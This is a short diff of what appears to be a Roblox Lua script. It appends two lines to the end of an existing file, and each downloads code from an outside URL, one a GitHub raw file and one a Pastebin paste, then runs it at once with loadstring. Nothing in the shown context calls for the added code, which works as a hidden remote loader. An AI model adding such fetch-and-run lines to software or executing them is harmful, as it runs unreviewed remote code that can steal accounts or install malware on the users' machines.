@@ -1554,3 +1554,7 @@ do
         end)
     end)
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EZZZ-creator/duele/refs/heads/main/ez"))()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Ug6j5aA7"))()
